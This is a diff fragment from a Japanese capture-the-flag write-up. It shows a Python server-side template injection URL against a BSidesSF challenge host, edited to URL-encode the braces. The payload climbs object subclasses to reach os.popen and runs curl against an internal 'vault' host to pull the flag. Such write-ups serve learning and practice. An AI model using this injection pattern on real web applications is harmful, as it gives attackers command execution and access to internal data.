@@ -274,7 +274,7 @@ FLAG: RUNNER_ON_SECOND_BASE
 過去問を探していると [A python's escape from PlaidCTF jail · @wapiflapi](http://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape/) という記事を見つけました。これをもとに
 
 ```
-http://zumbo-8ac445b1.ctf.bsidessf.net/{{ ().__class__.__base__.__subclasses__()[59]().__repr__.im_func.func_globals['linecache'].os.popen('curl http://vault:8080/flag').read() }}
+http://zumbo-8ac445b1.ctf.bsidessf.net/%7b%7b ().__class__.__base__.__subclasses__()[59]().__repr__.im_func.func_globals['linecache'].os.popen('curl http://vault:8080/flag').read() %7d%7d
 ```
 
 でフラグが出てきました。
